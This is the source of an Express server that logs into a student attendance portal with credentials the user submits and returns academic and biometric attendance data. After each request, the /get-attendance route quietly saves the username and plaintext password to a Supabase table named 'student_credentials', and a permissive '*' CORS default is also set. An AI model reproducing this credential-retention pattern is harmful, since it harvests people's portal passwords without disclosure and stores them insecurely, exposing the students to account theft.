const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const { getPage, login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");

const app = express();

// --- Middleware ---
app.use(cors({ origin: process.env.FRONTEND_URL || "*" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

// --- Attendance route ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  let page;
  try {
    console.log("Opening new page for user:", username);
    page = await getPage();
    await login(page, username, password);

    // Fetch academic and biometric data concurrently
    const [academicData, biometricData] = await Promise.all([
      fetchAcademic(page),
      fetchBiometric(page)
    ]);

    res.json({ academic: academicData, biometric: biometricData });

    // Save credentials & visit
    const now = new Date().toISOString();
    try {
      await supabase.from("student_credentials").upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
      await supabase.from("site_visits").insert([{ username, visited_at: now }]);
    } catch (err) {
      console.error("Supabase insert error:", err.message);
    }

  } catch (err) {
    console.error("Attendance fetch failed:", err.message);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    if (page) {
      await page.goto("about:blank");
      await page.close();
      console.log("Closed page for user:", username);
    }
  }
});

// --- Today's login count ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date();
    startOfDay.setHours(0,0,0,0);
    const endOfDay = new Date();
    endOfDay.setHours(23,59,59,999);

    const { count, error } = await supabase
      .from("site_visits")
      .select("id", { count: "exact", head: true })
      .gte("visited_at", startOfDay.toISOString())
      .lte("visited_at", endOfDay.toISOString());

    if (error) throw error;
    res.json({ today_logins: count });
  } catch (err) {
    console.error(err);
    res.status(500).json({ today_logins: 0 });
  }
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running ✅ on port ${PORT}`));
